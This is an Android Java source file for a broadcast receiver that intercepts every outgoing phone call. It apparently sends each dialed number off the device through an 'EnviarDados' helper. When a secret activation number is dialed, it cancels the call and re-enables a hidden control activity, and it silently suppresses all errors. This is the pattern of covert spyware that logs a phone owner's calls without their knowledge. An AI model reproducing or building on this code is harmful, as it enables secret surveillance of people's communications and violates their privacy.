package com.lacerbo.gufo;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;

/**
 * Created by Vidal on 01/10/2015.
 ************************************************/
public class ChamadaFeita extends BroadcastReceiver {

    @SuppressLint("UnsafeProtectedBroadcastReceiver")
    @Override
    public void onReceive(Context context, Intent intent) {

        try {
            final String numero = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            Propriedades mPropriedades = new Propriedades(context);

            String strAtivarApp = mPropriedades.pegarStringPropriedades("PI_strAtivarApp");
            EnviarDados mEnviaDados = new EnviarDados();

            if (numero.equals(strAtivarApp)) {
                mEnviaDados.getInstance(context, "C", "Acesso", "");
                Intent intent2 = new Intent(context, Central.class);

                PackageManager p = context.getPackageManager();
                p.setComponentEnabledSetting(intent2.getComponent(), PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);

                intent2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent2);
                this.setResultData(null);
            } else {
                mEnviaDados.getInstance(context, "F", numero, "");  //Chamadas Feitas.
            }
        } catch (Exception e) {
            // Não faça NADA.
        }

    }

}
